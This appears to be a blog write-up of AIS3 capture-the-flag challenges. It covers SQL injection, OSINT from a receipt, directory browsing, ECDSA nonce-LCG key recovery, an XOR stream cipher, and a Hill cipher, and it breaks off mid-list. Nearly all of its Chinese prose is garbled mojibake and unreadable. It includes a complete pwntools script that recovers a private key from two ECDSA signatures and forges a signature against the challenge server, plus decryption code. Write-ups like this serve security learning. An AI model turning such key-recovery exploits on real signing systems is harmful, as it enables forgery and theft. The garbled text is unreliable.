<h2 id="Login-Screen-1"><a href="#Login-Screen-1" class="headerlink" title="Login Screen 1"></a>Login Screen 1</h2><h3 id="é é¢åˆ†æ"><a href="#é é¢åˆ†æ" class="headerlink" title="é é¢åˆ†æ"></a>é é¢åˆ†æ</h3><p>é»é€²ç¶²é å¾Œæˆ‘å€‘çœ‹åˆ°äº†ä¸€å€‹ç™»å…¥ä»‹é¢<br><img src="/img/ais3/%E7%99%BB%E5%85%A5%E7%95%AB%E9%9D%A2.webp"><br>åŒ…å«:</p>
<ul>
<li>Username è¼¸å…¥æ¡†</li>
<li>Password è¼¸å…¥æ¡†</li>
<li>Login æŒ‰éˆ•</li>
</ul>
<h3 id="æ³¨å…¥æ”»æ“Š"><a href="#æ³¨å…¥æ”»æ“Š" class="headerlink" title="æ³¨å…¥æ”»æ“Š"></a>æ³¨å…¥æ”»æ“Š</h3><p><img src="/img/ais3/FLAGG.webp"><br>æˆ‘å€‘å°±å¾—åˆ°FLAG:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIS3&#123;1.Es55y_SQL_1nJ3ct10n_w1th_2fa_IuABDADGeP0&#125;</span><br></pre></td></tr></table></figure>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Ramen-CTF"><a href="#Ramen-CTF" class="headerlink" title="Ramen CTF"></a>Ramen CTF</h2><p>é€™é¡Œæ˜¯æˆ‘è¦ºå¾—æœ€æœ‰è¶£çš„</p>
<h3 id="é¡Œç›®è§€å¯Ÿ-1"><a href="#é¡Œç›®è§€å¯Ÿ-1" class="headerlink" title="é¡Œç›®è§€å¯Ÿ"></a>é¡Œç›®è§€å¯Ÿ</h3><p>ä»–çµ¦æˆ‘å€‘äº†ä¸€å¼µåœ–ç‰‡<br><img src="/img/ais3/chal.webp"><br>è£¡é¢æœ‰åƒ¹å€¼çš„åªæœ‰é‚£å¼µç™¼ç¥¨,æˆ‘å°±æƒ³åˆ°ç”¨ç™¼ç¥¨çš„è³‡è¨Šæ˜¯ä¸æ˜¯èƒ½æŸ¥åˆ°ä¸€äº›è³‡æ–™<br><img src="/img/ais3/%E7%99%BC%E7%A5%A8.webp"></p>
<p>å¯ä»¥å¾—åˆ°ä»¥ä¸‹è³‡è¨Š:</p>
<ul>
<li>å¹³å’Œâ€¦.</li>
<li>MFé–‹é ­</li>
<li>2025&#x2F;04&#x2F;13çš„ç™¼ç¥¨</li>
<li>éš¨æ©Ÿç¢¼ 7095</li>
<li>è³£æ–¹ç·¨è™Ÿ 3478592â€¦</li>
</ul>
<p>æ¥ä¸‹ä¾†ç”¨QRcodeæƒæç¨‹å¼å¾—çŸ¥:<br><img src="/img/ais3/QRcode.webp"></p>
<ul>
<li>ç™¼ç¥¨å®Œæ•´è™Ÿç¢¼ MF16879911</li>
<li>é¤é»æ˜¯è¦æ‹‰éºµ</li>
</ul>
<h3 id="åœ°å€å°‹æ‰¾"><a href="#åœ°å€å°‹æ‰¾" class="headerlink" title="åœ°å€å°‹æ‰¾"></a>åœ°å€å°‹æ‰¾</h3><p>å°‡ä¸Šé¢çš„è³‡æ–™è¼¸å…¥<a href="https://www.einvoice.nat.gov.tw/portal/btc/audit/btc601w/search">è²¡æ”¿éƒ¨é›»å­ç™¼ç¥¨æ•´åˆå¹³å°</a></p>
<p><img src="/img/ais3/%E5%AE%8C%E6%95%B4%E8%B3%87%E8%A8%8A.webp"><br>æˆ‘å€‘å°±å¾—åˆ°äº†åœ°å€,å†æŠŠåœ°å€è¼¸å…¥Google Map<br>æˆ‘å€‘å¯ä»¥æ‰¾åˆ°ä¸€å®¶ <strong>æ¨‚å±±æº«æ³‰æ‹‰éºµ</strong><br><img src="/img/ais3/Map.webp"></p>
<p>æˆ‘å€‘å°±å¯ä»¥å¾—åˆ°Flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIS3&#123;æ¨‚å±±æº«æ³‰æ‹‰éºµ:è¦æ‹‰éºµ&#125;</span><br></pre></td></tr></table></figure>
<h2 id="AIS3-Tiny-Server-Web-Misc"><a href="#AIS3-Tiny-Server-Web-Misc" class="headerlink" title="AIS3 Tiny Server - Web &#x2F; Misc"></a>AIS3 Tiny Server - Web &#x2F; Misc</h2><p>é¦–å…ˆé»é€²é¡Œç›®æä¾›çš„ç¶²å€ç”¨å¥½tokenä¹‹å¾Œ<br>æˆ‘å€‘æœƒä¾†åˆ° <a href="http://chals1.ais3.org:20096/index.html">http://chals1.ais3.org:20096/index.html</a><br><img src="/img/ais3/Tiny-server.webp"><br>æˆ‘å°±æŠŠå¸¸è¦‹çš„éš±è—è·¯å¾‘éƒ½åŠ ä¸Šå»,å¤šæ¬¡å˜—è©¦å¾Œç™¼ç¾<strong>åŠ &#x2F;&#x2F;å¯ä»¥å«å‡ºæ–‡ä»¶ç›®éŒ„</strong><br><img src="/img/ais3/%E7%9B%AE%E9%8C%84.webp"><br>è£¡é¢æœ‰å¾ˆå¤šæª”æ¡ˆ,æˆ‘å°±é»äº†æª”åæœ‰flagçš„<strong>readable_flag_jkO47trw1ctKlOIFC7smx7hivqoCPL8Y</strong><br><img src="/img/ais3/FLAG.webp"><br>æˆ‘å€‘å°±å¾—åˆ°äº†flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIS3&#123;tInY_we8_53Rv3R_wi7H_fILe_8R0Ws1nG_AS_@_FeAtURe&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><h3 id="æˆ‘å°±ç›´æ¥æ‰“ä¸Šå»owo"><a href="#æˆ‘å°±ç›´æ¥æ‰“ä¸Šå»owo" class="headerlink" title="æˆ‘å°±ç›´æ¥æ‰“ä¸Šå»owo"></a>æˆ‘å°±ç›´æ¥æ‰“ä¸Šå»owo</h3><p><img src="/img/ais3/welcome.webp"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="SlowECDSA"><a href="#SlowECDSA" class="headerlink" title="SlowECDSA"></a>SlowECDSA</h2><p>çœ‹åˆ°é¡Œç›®å¾Œï¼Œæˆ‘ç™¼ç¾é€™å°±æ˜¯ä¸€å€‹ç¶“å…¸çš„LCGæ”»æ“Šé¡Œã€‚ECDSA çš„å®‰å…¨æ€§å®Œå…¨ä¾è³´æ–¼éš¨æ©Ÿæ•¸ k çš„ä¸å¯é æ¸¬æ€§ï¼Œå¦‚æœæœå‹™å™¨ç”¨ LCG ä¾†ç”Ÿæˆé€™äº›éš¨æ©Ÿæ•¸ï¼Œé‚£å°±ä¸é›£äº†</p>
<h3 id="æ”¶é›†ç¯„æœ¬"><a href="#æ”¶é›†ç¯„æœ¬" class="headerlink" title="æ”¶é›†ç¯„æœ¬"></a><strong>æ”¶é›†ç¯„æœ¬</strong></h3><p>æ—¢ç„¶æœå‹™å™¨æä¾› <code>get_example</code> åŠŸèƒ½ï¼Œæˆ‘å°±å…ˆèª¿ç”¨å…©æ¬¡ï¼Œç²å–å…©å€‹ä¸åŒç°½åã€‚é€™æ¨£æˆ‘å°±èƒ½å¾—åˆ°ä½¿ç”¨é€£çºŒ LCG éš¨æ©Ÿæ•¸çš„ç°½åå°</p>
<h3 id="æ•¸å­¸é—œä¿‚"><a href="#æ•¸å­¸é—œä¿‚" class="headerlink" title="æ•¸å­¸é—œä¿‚"></a><strong>æ•¸å­¸é—œä¿‚</strong></h3><p>æ ¹æ“šPerplexityçš„è³‡æ–™:<br>ECDSA ç°½åå…¬å¼æ˜¯ï¼š<br>$$ s &#x3D; k^{-1} \times (h + r \times d) \bmod n $$</p>
<p>å¦‚æœ kâ‚ å’Œ kâ‚‚ æœ‰ç·šæ€§é—œä¿‚ï¼škâ‚‚ &#x3D; (a Ã— kâ‚ + c) mod nï¼Œé‚£æˆ‘å€‘å°±èƒ½å»ºä¸€å€‹é—œæ–¼ d çš„æ–¹ç¨‹å¼</p>
<h2 id="æ±‚è§£"><a href="#æ±‚è§£" class="headerlink" title="æ±‚è§£"></a><strong>æ±‚è§£</strong></h2><p>å¾å…©å€‹ç°½åçš„é—œä¿‚ä¸­ï¼Œå¯ä»¥æ¨å°å‡ºï¼š<br>$$ sâ‚‚^{-1} \times (h + râ‚‚ \times d) \equiv a \times sâ‚^{-1} \times (h + râ‚ \times d) + c \pmod{n} $$</p>
<p>è§£é€™å€‹ç·šæ€§æ–¹ç¨‹å°±èƒ½å¾—åˆ° dã€‚</p>
<h3 id="é æ¸¬"><a href="#é æ¸¬" class="headerlink" title="é æ¸¬"></a><strong>é æ¸¬</strong></h3><p>æœ‰äº†ç§é‘°ï¼Œæˆ‘å€‘å°±èƒ½åæ¨å‡ºçœŸæ­£çš„ kâ‚ï¼Œç„¶å¾Œåˆ©ç”¨ LCG çš„ç·šæ€§æ€§è³ªé æ¸¬ kâ‚ƒã€‚</p>
<h3 id="å½é€ ç°½å"><a href="#å½é€ ç°½å" class="headerlink" title="å½é€ ç°½å"></a><strong>å½é€ ç°½å</strong></h3><p>ç”¨é æ¸¬çš„ kâ‚ƒ å’Œå·²çŸ¥çš„ç§é‘°ï¼Œç‚ºç›®æ¨™æ¶ˆæ¯ â€œgive_me_flagâ€ ç”Ÿæˆå®Œå…¨æœ‰æ•ˆçš„ç°½åã€‚</p>
<h3 id="æ”»æ“Š"><a href="#æ”»æ“Š" class="headerlink" title="æ”»æ“Š"></a><strong>æ”»æ“Š</strong></h3><p>æˆ‘å«AIå¯«äº†ä¸€å€‹ Python è…³æœ¬ä¾†å¯¦ç¾é€™å€‹æ”»æ“Šï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ©¢åœ“æ›²ç·šåƒæ•¸ (secp256k1)</span></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</span></span><br><span class="line">a_curve = <span class="number">0</span></span><br><span class="line">b_curve = <span class="number">7</span></span><br><span class="line">n = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># LCG åƒæ•¸</span></span><br><span class="line">a = <span class="number">0x5deece66d</span></span><br><span class="line">c = <span class="number">0xb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_example_signature</span>(<span class="params">conn</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ç²å–ç¤ºä¾‹ç°½å&quot;&quot;&quot;</span></span><br><span class="line">    conn.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    response = conn.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>).decode()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è§£æ r å’Œ s å€¼</span></span><br><span class="line">    r_match = re.search(<span class="string">r&#x27;r=0x([0-9a-f]+)&#x27;</span>, response)</span><br><span class="line">    s_match = re.search(<span class="string">r&#x27;s=0x([0-9a-f]+)&#x27;</span>, response)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> r_match <span class="keyword">and</span> s_match:</span><br><span class="line">        r = <span class="built_in">int</span>(r_match.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        s = <span class="built_in">int</span>(s_match.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Received example: msg=&#x27;example_msg&#x27;, r=0x<span class="subst">&#123;r:x&#125;</span>, s=0x<span class="subst">&#123;s:x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;r&#x27;</span>: r, <span class="string">&#x27;s&#x27;</span>: s&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;ç„¡æ³•è§£æç°½å&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_for_private_key</span>(<span class="params">sig1, sig2, h, n, a, c</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ±‚è§£ç§é‘°&quot;&quot;&quot;</span></span><br><span class="line">    r1, s1 = sig1[<span class="string">&#x27;r&#x27;</span>], sig1[<span class="string">&#x27;s&#x27;</span>]</span><br><span class="line">    r2, s2 = sig2[<span class="string">&#x27;r&#x27;</span>], sig2[<span class="string">&#x27;s&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å»ºç«‹ç·šæ€§åŒé¤˜æ–¹ç¨‹æ±‚è§£ç§é‘°</span></span><br><span class="line">    <span class="comment"># s2^-1 * (h + r2 * d) â‰¡ a * s1^-1 * (h + r1 * d) + c (mod n)</span></span><br><span class="line">    </span><br><span class="line">    s1_inv = <span class="built_in">pow</span>(s1, -<span class="number">1</span>, n)</span><br><span class="line">    s2_inv = <span class="built_in">pow</span>(s2, -<span class="number">1</span>, n)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># é‡æ–°æ•´ç†æ–¹ç¨‹å¼</span></span><br><span class="line">    <span class="comment"># s2_inv * h + s2_inv * r2 * d â‰¡ a * s1_inv * h + a * s1_inv * r1 * d + c (mod n)</span></span><br><span class="line">    <span class="comment"># (s2_inv * r2 - a * s1_inv * r1) * d â‰¡ a * s1_inv * h - s2_inv * h + c (mod n)</span></span><br><span class="line">    </span><br><span class="line">    coeff_d = (s2_inv * r2 - a * s1_inv * r1) % n</span><br><span class="line">    rhs = (a * s1_inv * h - s2_inv * h + c) % n</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ±‚è§£ d</span></span><br><span class="line">    coeff_d_inv = <span class="built_in">pow</span>(coeff_d, -<span class="number">1</span>, n)</span><br><span class="line">    d = (coeff_d_inv * rhs) % n</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">predict_next_k</span>(<span class="params">sk, sig1, h, n, a, c</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;é æ¸¬ä¸‹ä¸€å€‹éš¨æ©Ÿæ•¸&quot;&quot;&quot;</span></span><br><span class="line">    r1, s1 = sig1[<span class="string">&#x27;r&#x27;</span>], sig1[<span class="string">&#x27;s&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è¨ˆç®—å¯¦éš›çš„ k1</span></span><br><span class="line">    s1_inv = <span class="built_in">pow</span>(s1, -<span class="number">1</span>, n)</span><br><span class="line">    k1_actual = (s1_inv * (h + r1 * sk)) % n</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Calculated k1_actual: 0x<span class="subst">&#123;k1_actual:x&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è¨ˆç®— k2</span></span><br><span class="line">    k2_actual = (a * k1_actual + c) % n</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># é æ¸¬ k3</span></span><br><span class="line">    k3_for_flag = (a * k2_actual + c) % n</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Predicted k3 for flag signing: 0x<span class="subst">&#123;k3_for_flag:x&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> k3_for_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forge_signature</span>(<span class="params">k, h, sk, G, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å½é€ ç°½å&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># è¨ˆç®— r</span></span><br><span class="line">    point = k * G</span><br><span class="line">    r = point.xy()[<span class="number">0</span>] % n</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è¨ˆç®— s</span></span><br><span class="line">    k_inv = <span class="built_in">pow</span>(k, -<span class="number">1</span>, n)</span><br><span class="line">    s = (k_inv * (h + r * sk)) % n</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># é€£æ¥åˆ°æœå‹™å™¨</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Opening connection to chals1.ais3.org on port 19000: Done&quot;</span>)</span><br><span class="line">    conn = remote(<span class="string">&#x27;chals1.ais3.org&#x27;</span>, <span class="number">19000</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è·³éåˆå§‹è¨Šæ¯</span></span><br><span class="line">    conn.recvuntil(<span class="string">b&#x27;Choice: &#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ç²å–ç¬¬ä¸€å€‹ç¤ºä¾‹ç°½å</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Getting first example signature...&quot;</span>)</span><br><span class="line">    example1 = get_example_signature(conn)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ç²å–ç¬¬äºŒå€‹ç¤ºä¾‹ç°½å</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Getting second example signature...&quot;</span>)</span><br><span class="line">    example2 = get_example_signature(conn)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å»ºç«‹æ©¢åœ“æ›²ç·š</span></span><br><span class="line">    E = EllipticCurve(GF(p), [a_curve, b_curve])</span><br><span class="line">    G = E(<span class="number">0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798</span>,</span><br><span class="line">          <span class="number">0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è¨ˆç®— example_msg çš„å“ˆå¸Œ</span></span><br><span class="line">    h_ex = <span class="built_in">int</span>.from_bytes(sha1(<span class="string">b&quot;example_msg&quot;</span>).digest(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] h_ex (for &#x27;example_msg&#x27;) = 0x<span class="subst">&#123;h_ex:x&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ±‚è§£ç§é‘°</span></span><br><span class="line">    sk = solve_for_private_key(example1, example2, h_ex, n, a, c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Recovered private key (sk): 0x<span class="subst">&#123;sk:x&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># é æ¸¬ä¸‹ä¸€å€‹éš¨æ©Ÿæ•¸</span></span><br><span class="line">    k3_predicted = predict_next_k(sk, example1, h_ex, n, a, c)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è¨ˆç®— give_me_flag çš„å“ˆå¸Œ</span></span><br><span class="line">    h_flag = <span class="built_in">int</span>.from_bytes(sha1(<span class="string">b&quot;give_me_flag&quot;</span>).digest(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] h_flag (for &#x27;give_me_flag&#x27;) = 0x<span class="subst">&#123;h_flag:x&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å½é€ ç°½å</span></span><br><span class="line">    r_flag, s_flag = forge_signature(k3_predicted, h_flag, sk, G, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Forged signature for &#x27;give_me_flag&#x27;: r=0x<span class="subst">&#123;r_flag:x&#125;</span>, s=0x<span class="subst">&#123;s_flag:x&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æäº¤å½é€ çš„ç°½å</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending forged signature to verify...&quot;</span>)</span><br><span class="line">    conn.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    conn.sendline(<span class="built_in">hex</span>(r_flag)[<span class="number">2</span>:].encode())</span><br><span class="line">    conn.sendline(<span class="built_in">hex</span>(s_flag)[<span class="number">2</span>:].encode())</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ¥æ”¶å›æ‡‰</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Server response:&quot;</span>)</span><br><span class="line">    response = conn.recvall().decode()</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># é—œé–‰é€£æ¥</span></span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>åŸ·è¡Œå¾Œ,æˆ‘å€‘å¾—åˆ°äº†Flagï¼š<br><img src="/img/ais3/response.webp"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIS3&#123;Aff1n3_nounc3s_c@N_bE_broke_ezily...&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Stream"><a href="#Stream" class="headerlink" title="Stream"></a>Stream</h2><p>æ ¹æ“šé¡Œç›®æä¾›çš„pythonç¨‹å¼,æˆ‘å€‘çœ‹åˆ°äº†é€™å€‹åŠ å¯†æ–¹æ¡ˆçš„ç¼ºé™·:<br><strong>ç•¶æ˜æ–‡ç›¸å°æ–¼å¯†é‘°è¼ƒå°æ™‚ï¼ŒXOR é‹ç®—çš„çµæœä¸»è¦ç”±å¯†é‘°æ±ºå®š</strong><br>æ‰€ä»¥æˆ‘å€‘å¯ä»¥åˆ©ç”¨æ•¸å­¸é—œä¿‚é€†å‘æ”»æ“Š<br><img src="/img/ais3/%E7%BC%BA%E9%99%B7.webp"></p>
<h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a><strong>æ€è·¯</strong></h3><p>ç¾åœ¨æˆ‘å€‘çŸ¥é“åŠ å¯†å…¬å¼ç‚º:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encrypted_int = flag_int âŠ• (rand_numÂ²)</span><br></pre></td></tr></table></figure>
<p>ç•¶ flag_int é å°æ–¼ rand_numÂ² æ™‚ï¼Œæˆ‘å€‘æœ‰:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encrypted_int â‰ˆ rand_numÂ²</span><br></pre></td></tr></table></figure>
<p>é‚£æˆ‘å€‘å°±å¯ä»¥é€†æ¨flagäº†</p>
<h3 id="æ”»æ“Š-1"><a href="#æ”»æ“Š-1" class="headerlink" title="æ”»æ“Š"></a><strong>æ”»æ“Š</strong></h3><p>æˆ‘å€‘å…ˆè¨ˆç®—è¿‘ä¼¼éš¨æ©Ÿæ•¸:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">approx_rand_num = math.isqrt(encrypted_int)</span><br></pre></td></tr></table></figure>
<p>å†æœç´¢åç§»äº®:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(-search_width, search_width + <span class="number">1</span>):</span><br><span class="line">    rand_num_candidate = approx_rand_num + offset</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹ä¾†å°æ¯å€‹å€™é¸éš¨æ©Ÿæ•¸ï¼Œè¨ˆç®—å…¶å¹³æ–¹ä¸¦å˜—è©¦è§£å¯†:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key_squared = rand_num_candidate ** <span class="number">2</span></span><br><span class="line">flag_candidate = encrypted_int ^ key_squared</span><br></pre></td></tr></table></figure>
<p>åŸºæœ¬éæ¿¾:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ’é™¤ç„¡æ•ˆçµæœ</span></span><br><span class="line"><span class="keyword">if</span> flag_candidate == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æª¢æŸ¥é•·åº¦åˆç†æ€§</span></span><br><span class="line">num_bits = flag_candidate.bit_length()</span><br><span class="line">byte_len = (num_bits + <span class="number">7</span>) // <span class="number">8</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">5</span> &lt; byte_len &lt; <span class="number">80</span>):</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>è½‰æ›ç‚ºå­—ä¸²</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_bytes</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    byte_length = (n.bit_length() + <span class="number">7</span>) // <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> n.to_bytes(byte_length, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag_bytes_candidate = int_to_bytes(flag_candidate)</span><br></pre></td></tr></table></figure>
<p>æœ€å¾Œä¸€éƒ¨,è§£ç¢¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        potential_flag = flag_bytes_candidate.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æª¢æŸ¥ AIS3 æ ¼å¼</span></span><br><span class="line">        <span class="keyword">if</span> (potential_flag.startswith(<span class="string">&#x27;AIS3&#123;&#x27;</span>) <span class="keyword">and</span> </span><br><span class="line">            potential_flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>) <span class="keyword">and</span> </span><br><span class="line">            potential_flag.isprintable()):</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[æˆåŠŸ] æ‰¾åˆ° AIS3 flagï¼Œoffset: <span class="subst">&#123;offset&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;å€™é¸ rand_num: <span class="subst">&#123;<span class="built_in">hex</span>(rand_num_candidate)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Flag bytes: <span class="subst">&#123;flag_bytes_candidate&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;è§£å¯†çµæœ: <span class="subst">&#123;potential_flag&#125;</span>&quot;</span>)</span><br><span class="line">            found_flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;è™•ç† offset <span class="subst">&#123;offset&#125;</span> æ™‚ç™¼ç”ŸéŒ¯èª¤: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found_flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nåœ¨ç¯„åœ [<span class="subst">&#123;-search_width&#125;</span>, <span class="subst">&#123;search_width&#125;</span>] å…§æœªæ‰¾åˆ°æœ‰æ•ˆ flag&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å»ºè­°å¢åŠ  search_width æˆ–æª¢æŸ¥åŠ å¯†å‡è¨­&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>é‹è¡Œå¾Œæˆ‘å€‘å°±æ‹¿åˆ°äº†flag:<br><img src="/img/ais3/print.webp"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIS3&#123;no_more_junks...plz&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Hill"><a href="#Hill" class="headerlink" title="Hill"></a>Hill</h2><p>ç³»çµ±ä½¿ç”¨å…©å€‹çŸ©é™£ A å’Œ Bï¼š</p>
<ul>
<li><p>ç¬¬ä¸€å€‹åˆ†çµ„ï¼šcâ‚€ &#x3D; A Ã— mâ‚€</p>
</li>
<li><p>å¾ŒçºŒåˆ†çµ„ï¼šcáµ¢ &#x3D; A Ã— máµ¢ + B Ã— máµ¢â‚‹â‚</p>
</li>
</ul>
<h3 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a><strong>æ€è·¯</strong></h3><p>(ä¼ºæœå™¨åªå…è¨±ä¸€æ¬¡ <code>input()</code>)<br>æˆ‘éœ€è¦ä¸€å€‹ç‰¹æ®Šçš„è¼¸å…¥åºåˆ—ä¾†åŒæ™‚æ¢å¾© A å’Œ B çŸ©é™£ã€‚æˆ‘æƒ³åˆ°ç”¨æ¨™æº–åŸºå‘é‡:<br><code>è¼‰è· = [eâ‚€, 0, eâ‚, 0, eâ‚‚, 0, ..., eâ‚‡, 0]</code></p>
<p>ç•¶æœå‹™å™¨è™•ç†é€™å€‹è¼‰è·æ™‚ï¼š</p>
<ul>
<li>câ‚€ &#x3D; A Ã— eâ‚€  å¾—åˆ° A çš„ 0 </li>
<li>câ‚ &#x3D; A Ã— 0 + B Ã— eâ‚€  å¾—åˆ° B çš„ 0 </li>
